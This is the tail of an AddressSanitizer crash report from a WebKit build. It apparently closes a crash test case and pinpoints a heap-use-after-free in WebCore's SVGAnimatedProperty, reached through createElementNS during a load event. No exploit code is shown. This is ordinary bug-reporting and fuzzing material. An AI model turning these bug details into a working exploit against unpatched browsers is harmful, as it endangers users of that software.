    #10 0x11a6f9948 in long long WebCore::IDLOperation<WebCore::JSDocument>::call<&(WebCore::jsDocumentPrototypeFunctionCreateElementNSBody(JSC::ExecState*, WebCore::JSDocument*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xa0b948)
    #11 0x45a6fb801176  (<unknown module>)
    #12 0x129d11df0 in llint_entry (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcc0df0)
    #13 0x129d11df0 in llint_entry (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcc0df0)
    #14 0x129d02998 in vmEntryToJavaScript (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcb1998)
    #15 0x12b081949 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2030949)
    #16 0x12b6b7d0a in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2666d0a)
    #17 0x12b6b7eaf in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2666eaf)
    #18 0x12b6b8342 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2667342)
    #19 0x11be7aabb in WebCore::JSExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x218cabb)
    #20 0x11bec8f43 in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21daf43)
    #21 0x11c521a57 in WebCore::EventTarget::innerInvokeEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener, WTF::DumbPtrTraits<WebCore::RegisteredEventListener> >, 1ul, WTF::CrashOnOverflow, 16ul>, WebCore::EventTarget::EventInvokePhase) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2833a57)
    #22 0x11c51c6f7 in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WebCore::EventTarget::EventInvokePhase) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x282e6f7)
    #23 0x11cef5ff9 in WebCore::DOMWindow::dispatchEvent(WebCore::Event&, WebCore::EventTarget*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3207ff9)
    #24 0x11cf060de in WebCore::DOMWindow::dispatchLoadEvent() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x32180de)
    #25 0x11c42fe9f in WebCore::Document::dispatchWindowLoadEvent() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2741e9f)
    #26 0x11c428972 in WebCore::Document::implicitClose() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x273a972)
    #27 0x11cd86c5b in WebCore::FrameLoader::checkCompleted() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3098c5b)
    #28 0x11cd835dc in WebCore::FrameLoader::finishedParsing() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x30955dc)
    #29 0x11c44d142 in WebCore::Document::finishedParsing() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x275f142)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x42c451c) in WebCore::SVGAnimatedProperty::SVGAnimatedProperty(WebCore::SVGElement*, WebCore::QualifiedName const&, WebCore::AnimatedPropertyType)
Shadow bytes around the buggy address:
  0x1c2c0000e540: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e550: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e560: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e570: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
  0x1c2c0000e580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x1c2c0000e590: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e5a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e5b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e5c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c2c0000e5d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa
  0x1c2c0000e5e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==66283==ABORTING
2018-12-03 16:32:07.422 MiniBrowser[66282:2122553] WebContent process crashed; reloading
-->
